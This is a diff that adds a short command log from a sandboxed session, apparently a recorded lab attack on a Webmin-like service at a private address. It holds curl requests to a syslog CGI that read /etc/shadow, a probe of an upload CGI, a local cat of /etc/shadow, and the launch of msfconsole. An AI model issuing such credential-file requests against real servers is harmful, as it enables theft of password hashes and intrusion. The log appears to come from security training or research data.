@@ -1,0 +1,8 @@
+{"sandbox_id": "24", "timestamp_str": "2021-04-22T14:31:52.225Z", "cmd_type": "bash-command", "cmd": "curl 172.18.1.5:10000/updown/upload.cgi"}
+{"sandbox_id": "24", "timestamp_str": "2021-04-22T14:32:56.287Z", "cmd_type": "bash-command", "cmd": "apt install lynx"}
+{"sandbox_id": "24", "timestamp_str": "2021-04-22T14:33:29.850Z", "cmd_type": "bash-command", "cmd": "curl 172.18.1.5:10000/syslog/save_log.cgi?view=1&file=/etc/shadow"}
+{"sandbox_id": "24", "timestamp_str": "2021-04-22T14:34:04.508Z", "cmd_type": "bash-command", "cmd": "curl 172.18.1.5:10000/syslog/save_log.cgi?view=1&file=/etc/"}
+{"sandbox_id": "24", "timestamp_str": "2021-04-22T14:34:16.793Z", "cmd_type": "bash-command", "cmd": "ls /etc/shadow"}
+{"sandbox_id": "24", "timestamp_str": "2021-04-22T14:34:20.440Z", "cmd_type": "bash-command", "cmd": "cat /etc/shadow"}
+{"sandbox_id": "24", "timestamp_str": "2021-04-22T14:34:26.233Z", "cmd_type": "bash-command", "cmd": "curl 172.18.1.5:10000/syslog/save_log.cgi?view=1&file=/etc/shadow"}
+{"sandbox_id": "24", "timestamp_str": "2021-04-22T14:35:57.817Z", "cmd_type": "bash-command", "cmd": "msfconsole"}
